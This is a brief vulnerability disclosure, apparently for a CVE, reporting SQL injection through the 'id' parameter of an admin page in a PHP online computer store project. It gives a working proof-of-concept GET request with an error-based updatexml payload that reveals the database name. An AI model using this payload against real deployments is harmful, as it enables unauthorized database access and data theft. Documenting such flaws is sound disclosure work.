Online Computer and Laptop Store has a front-end SQL injection vulnerability

version:v2021

route:/php-ocls/admin/maintenance/manage_brand.php

download:https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

code analysis
The id parameter here can be controlled and directly brought into the SQL statement for execution.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/13e9ec02-02e5-4b31-84b8-d95ad9e32dc7)


POC
```
GET /php-ocls/admin/maintenance/manage_brand.php?id=1%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/e6a575be-ded0-4842-888e-8edf73786840)
Get the database name: ocls_db
